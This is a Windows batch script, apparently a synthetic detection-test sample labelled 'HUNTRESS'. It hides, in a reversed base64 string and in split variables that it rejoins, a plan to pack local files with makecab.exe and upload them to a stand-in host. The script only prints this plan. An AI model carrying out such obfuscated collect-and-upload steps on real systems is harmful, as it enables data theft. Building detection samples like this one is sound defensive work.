@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:split_fragments|reverse

rem HUNTRESS-MATERIAL:ZGFvbHB1L2RpbGF2bmkuZWxwbWF4ZS44NTdmZmFmNTZlLy86c3B0dGg9bHJ1X2Rhb2xwdXxiYWMuODU3ZmZhZjU2ZS10Y2VsbG9jXGJhTHNzZXJ0bnVIXGNpbGJ1UFxzcmVzVVw6Qz1odGFwX2VjcnVvc3w4NTdmZmFmNTZlLW5naWFwbWFjPWRpX25naWFwbWFjfGVub249ZWdhdWduYWxfdHhlbnx5cnRlcl9rY2FibGxhZj1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5iYWNla2FtPXJldHBhZGF8ZXRvbWVyX2Rhb2xwdSxyZWZzbmFydF9lcmFwZXJwLGxhY29sX2V0YWNvbD1zcGV0c3wxPXY=

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set FrAg0=v=1^|steps=locate_local,prepare_transfer,upload_remote^|adapter=makecab
set FrAg1=.exe^|stage_count=1^|graph=fallback_retry^|next_language=none^|campaign_i
set FrAg2=d=campaign-e65faff758^|source_path=C:\Users\Public\HuntressLab\collect
set FrAg3=-e65faff758.cab^|upload_url=https://e65faff758.example.invalid/upload

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=463a2723"

call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"
exit /b 0
:HUNTRESS_EMIT

echo(!ReCoVeReD!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-e65faff758.cab to https://e65faff758.example.invalid/upload

exit /b 0

